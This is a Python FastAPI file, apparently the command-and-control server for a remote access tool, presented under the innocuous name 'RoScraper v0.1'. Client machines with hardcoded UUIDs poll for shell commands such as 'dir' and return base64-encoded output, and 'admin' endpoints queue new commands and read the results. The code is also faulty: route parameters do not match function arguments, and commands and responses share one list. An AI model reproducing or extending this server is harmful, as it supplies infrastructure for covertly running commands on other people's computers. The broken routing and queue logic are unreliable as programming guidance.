import re

from fastapi import FastAPI, Response, Request, Form
import logging
import base64

# Configure Logging
logging.basicConfig(filename="logs.log",
                    format='%(asctime)s %(message)s',
                    filemode='w')

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

valid_uuids = ['test-system',
               'ligma',
               'tctcl']

admin_uuids = ['cockandballs']

# Commands are executed in reverse order - fix this.
command_response_list = ['dir',
                         'cd ..',
                         'dir']

response_list = ['']

app = FastAPI()


@app.get('/<{uuid}>')
def root(uuid: str):
    return Response('RoScraper v0.1')


@app.get('/ping/<{uuid}>')
def ping(uuid: str):
    return Response('Success')


@app.get('/commands/<{uuid}>')
def command(uuid: str):
    if len(command_response_list) > 0:
        return Response(command_response_list[len(command_response_list) - 1])
    else:
        return Response('')


@app.get('/command_response/<{uuid}>{response}')
def command_response(response: str):
    response = decode(response)
    command_response_list.insert(0, response)
    print(command_response_list[0])
    return Response('')


# Admin endpoints start here
# (these are scary, don't allow access to these without an admin UUID)

@app.get('/admin/send_command/<{admin_uuid}>{response}')
def admin_send_command(admin_uuid: str, requested_command: str):
    if admin_uuid in admin_uuids:
        requested_command = encode(requested_command)
        command_response_list.insert(0, requested_command)
        return Response('')
    else:
        return Response('Admin UUID Required')


@app.get('/admin/view_command_output/<{admin_uuid}>{response}')
def admin_view_command_output(admin_uuid: str, response: str):
    if admin_uuid in admin_uuids:
        command_output = encode(command_response_list[0])
        return Response(command_output)
    else:
        return Response('Admin UUID Required')


# Logging middleware
@app.middleware("http")
async def log_request(request: Request, call_next):
    ip = str(request.client.host)
    full_path = str(request.url).replace(str(request.base_url), '')
    start = full_path.find('<')
    end = full_path.find('>')
    uuid = full_path[start + 1:end]
    path = full_path[0:start]

    logger.info(f'{ip}, {uuid}, {path}')

    if uuid in valid_uuids:
        response = await call_next(request)
        return response
    else:
        return Response('UUID invalid', status_code=401)


# Misc functions start here

def decode(string):
    string = string.encode('ascii')
    string = base64.b64decode(string)
    string = string.decode('ascii')
    return string


def encode(string):
    string = string.encode('ascii')
    string = base64.b64encode(string)
    string = string.decode('ascii')
    return string
